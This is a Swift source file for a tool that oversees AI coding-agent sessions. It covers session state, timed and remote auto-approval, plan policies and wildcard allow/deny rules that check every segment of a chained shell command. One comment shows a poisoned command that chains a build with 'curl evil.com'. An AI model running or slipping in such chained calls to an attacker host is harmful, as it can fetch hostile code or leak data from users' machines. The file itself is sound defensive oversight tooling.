import Foundation

/// The agent CLI that owns a session — Claude Code or OpenAI Codex.
enum AgentKind: String, Codable {
    case claude
    case codex
}

/// Tracks state for a single agent session (Claude Code or Codex CLI).
final class Session: ObservableObject, Identifiable {
    let pid: Int
    let startedAt: Date
    let agent: AgentKind

    @Published var sessionId: String?
    @Published var cwd: String?
    @Published var model: String?
    @Published var label: String = ""

    /// True when `label` was auto-derived from the session's first prompt rather
    /// than set explicitly (UI rename, `/rename`, or `--name`). An explicit name
    /// always overrides a derived one and clears this flag.
    @Published var labelIsDerived: Bool = false

    @Published var isPaused: Bool = false
    @Published var isAlive: Bool = true
    @Published var endedAt: Date?
    @Published var isAutoApproveEnabled: Bool = false
    @Published var isSubAgentInheritEnabled: Bool = false
    @Published var lastPrompt: String?

    /// Set to the current time on each tool call so the monitor row can flash a
    /// brief highlight. Cleared back to nil ~600ms later by the daemon so SwiftUI
    /// can animate the fade. Don't use this for stats — it isn't durable.
    @Published var lastActivityAt: Date?

    // Timed auto-approve
    @Published var autoApproveUntil: Date?

    // Session rules — wildcard patterns for approval or denial
    @Published var sessionRules: [SessionRule] = []

    /// Prompt-rule IDs silenced for this session. Transient; cleared on revoke.
    @Published var suppressedRuleIds: Set<UUID> = []

    /// Absolute path of the most recent approved Write/Edit/MultiEdit that landed
    /// under ~/.claude/plans/**/*.md. Captured by HookRouter post-decision so plan
    /// engage can find the plan without depending on session-label/folder conventions.
    @Published var lastPlanPath: String?

    // Plan policy — overlay + auto-approve while a plan is engaged. See PlanPolicy.swift.
    // Worker threads read `isPlanPolicyEngaged`, backed by a lock-protected non-@Published
    // flag for synchronous visibility. The matching @Published fields below carry
    // UI-display state and are updated on main.
    @Published var planEngagedAt: Date?
    /// Frozen at engage time. New plan writes update lastPlanPath but NOT this.
    @Published var engagedPlanPath: String?
    @Published var engagedPlanHash: String?
    @Published var planPolicyDroppedReason: String?

    @Published var isRemoteApprovalEnabledUI: Bool = false
    @Published var remoteApprovalUntil: Date?

    private var _remoteEnabled = false
    private var _remoteUntil: Date?
    private let remoteLock = NSLock()

    var isRemoteApprovalActive: Bool {
        remoteLock.lock()
        defer { remoteLock.unlock() }
        guard _remoteEnabled else { return false }
        if let until = _remoteUntil { return until > Date() }
        return true
    }

    func setRemoteApprovalEnabled(_ enabled: Bool, until: Date?) {
        remoteLock.lock()
        _remoteEnabled = enabled
        _remoteUntil = enabled ? until : nil
        remoteLock.unlock()
        DispatchQueue.main.async {
            self.isRemoteApprovalEnabledUI = enabled
            self.remoteApprovalUntil = enabled ? until : nil
        }
    }

    func disableRemoteApproval() {
        setRemoteApprovalEnabled(false, until: nil)
    }

    var remoteApprovalSnapshot: (enabled: Bool, until: Date?) {
        remoteLock.lock()
        defer { remoteLock.unlock() }
        return (_remoteEnabled, _remoteUntil)
    }

    private var _planPolicyEngaged: Bool = false
    private let planPolicyLock = NSLock()

    var isPlanPolicyEngaged: Bool {
        planPolicyLock.lock()
        defer { planPolicyLock.unlock() }
        return _planPolicyEngaged
    }

    func setPlanPolicyEngaged(_ value: Bool) {
        planPolicyLock.lock()
        _planPolicyEngaged = value
        planPolicyLock.unlock()
    }

    private var _overlayRules: [PlanPolicyRule] = []

    /// Plan-declared allow/deny rules, layered while a plan is engaged. Guarded by
    /// `planPolicyLock` because it's set on engage (main) and read by the socket worker
    /// on every PreToolUse. Empty when no plan is engaged.
    var overlayRules: [PlanPolicyRule] {
        get { planPolicyLock.lock(); defer { planPolicyLock.unlock() }; return _overlayRules }
        set { planPolicyLock.lock(); _overlayRules = newValue; planPolicyLock.unlock() }
    }

    // Worker-mutable state. NOT @Published on purpose — both are touched on
    // every PreToolUse hook from background threads, and `@Published`
    // mutations from non-main contend with SwiftUI's main-thread publish
    // chain (under load this manifested as workers deadlocking after
    // accept(), see freeze investigation 2026-05-04). UI sees these update
    // via the 2-second stats timer in MonitorViewModel which calls
    // `objectWillChange.send()` per session, triggering a re-render that
    // reads the current values via the computed accessors below.

    let stats = SessionStats()

    /// Temp files containing sensitive data flow. TaintedPathStore is
    /// thread-safe; existing UI code can still call `.count`, `.sorted()`,
    /// `.isEmpty` on it directly via the conveniences on the store type.
    let taintedPaths = TaintedPathStore()

    let tags = SessionTagStore()

    // Computed proxies so `session.toolCallCount` style call-sites in views
    // and the stats aggregator still read naturally.
    var toolCallCount: Int { stats.toolCallCount }
    var allowCount: Int { stats.allowCount }
    var blockCount: Int { stats.blockCount }

    var id: Int { pid }

    /// PID reuse can produce a live + dead session with the same PID; isAlive disambiguates.
    var rowIdentity: String {
        "\(pid)-\(isAlive ? "live" : "dead")-\(sessionId ?? "")"
    }

    var isAutoApproveActive: Bool {
        guard let until = autoApproveUntil else { return false }
        return until > Date()
    }

    var autoApproveRemaining: TimeInterval? {
        guard let until = autoApproveUntil else { return nil }
        let remaining = until.timeIntervalSinceNow
        return remaining > 0 ? remaining : nil
    }

    init(pid: Int, cwd: String? = nil, startedAt: Date? = nil, agent: AgentKind = .claude) {
        self.pid = pid
        self.startedAt = startedAt ?? Date()
        self.cwd = cwd
        self.agent = agent
    }

    func revokeAutoApprove() {
        isAutoApproveEnabled = false
        isSubAgentInheritEnabled = false
        autoApproveUntil = nil
        sessionRules.removeAll()
        suppressedRuleIds.removeAll()
        setPlanPolicyEngaged(false)
        overlayRules = []
        planEngagedAt = nil
        engagedPlanPath = nil
        engagedPlanHash = nil
        planPolicyDroppedReason = nil
    }

    /// Check if a tool call matches any session allow rule.
    func matchesSessionRule(toolName: String, command: String?, filePath: String?) -> SessionRule? {
        sessionRules.first { $0.verdict == .allow && $0.matches(toolName: toolName, command: command, filePath: filePath) }
    }

    /// Check if a tool call matches any session deny rule.
    func matchesSessionDeny(toolName: String, command: String?, filePath: String?) -> SessionRule? {
        sessionRules.first { $0.verdict == .block && $0.matches(toolName: toolName, command: command, filePath: filePath) }
    }
}

/// A wildcard pattern rule for session-scoped approval or denial.
///
/// Examples:
///   - `Bash: swift build*`  (allow) — matches any swift build command
///   - `Bash: git *`         (allow) — matches any git command
///   - `Edit: */production.yml` (block) — blocks edits to production config
///   - `Read: *`             (allow) — matches all reads
struct SessionRule: Identifiable {
    let id = UUID()
    let toolName: String
    let pattern: String
    let verdict: DecisionVerdict
    let explanation: String?

    init(toolName: String, pattern: String, verdict: DecisionVerdict = .allow, explanation: String? = nil) {
        self.toolName = toolName
        self.pattern = pattern
        self.verdict = verdict
        self.explanation = explanation
    }

    /// Match using simple glob-style wildcards (* only).
    /// For Bash commands, splits on command separators (&&, ||, ;, |) and
    /// requires EVERY segment to match — prevents poisoning via chained commands.
    func matches(toolName: String, command: String?, filePath: String?) -> Bool {
        guard self.toolName == toolName || self.toolName == "*" else { return false }

        let raw: String
        switch toolName {
        case "Bash":
            raw = command ?? ""
        case "Edit", "MultiEdit", "Write", "Read", "Glob", "Grep":
            raw = filePath ?? command ?? ""
        default:
            raw = command ?? filePath ?? ""
        }

        // Sanitize typographic dashes
        let target = raw
            .replacingOccurrences(of: "\u{2013}", with: "-")
            .replacingOccurrences(of: "\u{2014}", with: "--")
            .replacingOccurrences(of: "\u{2012}", with: "-")

        if toolName == "Bash" {
            // Split on command separators and require ALL segments to match.
            // "swift build && curl evil.com" → ["swift build", "curl evil.com"]
            // Glob "swift build*" matches segment 1 but NOT segment 2 → rejected.
            let segments = Self.splitCommandSegments(target)
            return !segments.isEmpty && segments.allSatisfy { globMatch(pattern: pattern, string: $0) }
        }

        return globMatch(pattern: pattern, string: target)
    }

    /// Simple glob matching: `*` matches any sequence of characters.
    private func globMatch(pattern: String, string: String) -> Bool {
        guard let regex = PatternCompiler.compileGlob(pattern) else { return false }
        return PatternCompiler.matches(regex, in: string)
    }

    /// Split a bash command on separators (&&, ||, ;, |) into segments.
    static func splitCommandSegments(_ command: String) -> [String] {
        // Split on && || ; | (greedy, longest match first)
        let pattern = #"&&|\|\||\||;"#
        guard let regex = try? NSRegularExpression(pattern: pattern) else {
            return [command]
        }
        let nsCommand = command as NSString
        var segments: [String] = []
        var lastEnd = 0

        let matches = regex.matches(in: command, range: NSRange(location: 0, length: nsCommand.length))
        for match in matches {
            let segRange = NSRange(location: lastEnd, length: match.range.location - lastEnd)
            let seg = nsCommand.substring(with: segRange).trimmingCharacters(in: .whitespaces)
            if !seg.isEmpty { segments.append(seg) }
            lastEnd = match.range.location + match.range.length
        }
        // Last segment
        let remaining = nsCommand.substring(from: lastEnd).trimmingCharacters(in: .whitespaces)
        if !remaining.isEmpty { segments.append(remaining) }

        return segments
    }

    /// Suggest a wildcard pattern from a command or file path.
    static func suggestPattern(toolName: String, command: String?, filePath: String?) -> String {
        switch toolName {
        case "Bash":
            guard let cmd = command, !cmd.isEmpty else { return "*" }
            // Multi-line commands suggest first-non-blank-line + `*` — pasting the whole blob
            // is unworkable UX (contains regex meta that auto-promotes the panel into regex mode).
            // Single-line keeps its literal text; user broadens by appending `*`.
            let lines = cmd.split(separator: "\n", omittingEmptySubsequences: false)
            let firstSubstantive = lines.first { !$0.trimmingCharacters(in: .whitespaces).isEmpty }
            guard let first = firstSubstantive else { return "*" }
            let normalized = String(first).trimmingCharacters(in: .whitespaces)
            if lines.count == 1 || lines.filter({ !$0.trimmingCharacters(in: .whitespaces).isEmpty }).count == 1 {
                return normalized
            }
            let withoutContinuation = normalized.hasSuffix("\\")
                ? String(normalized.dropLast()).trimmingCharacters(in: .whitespaces)
                : normalized
            return "\(withoutContinuation)*"

        case "Edit", "MultiEdit", "Write":
            guard let path = filePath else { return "*" }
            // "/Users/jay/project/Sources/Gavel/main.swift" → "Sources/Gavel/*" or dir/*
            let components = path.split(separator: "/")
            if components.count >= 2 {
                let dir = components.dropLast().suffix(2).joined(separator: "/")
                return "\(dir)/*"
            }
            return "*"

        case "Read", "Glob", "Grep":
            // Read-only tools — suggest broad pattern
            return "*"

        default:
            return "*"
        }
    }
}
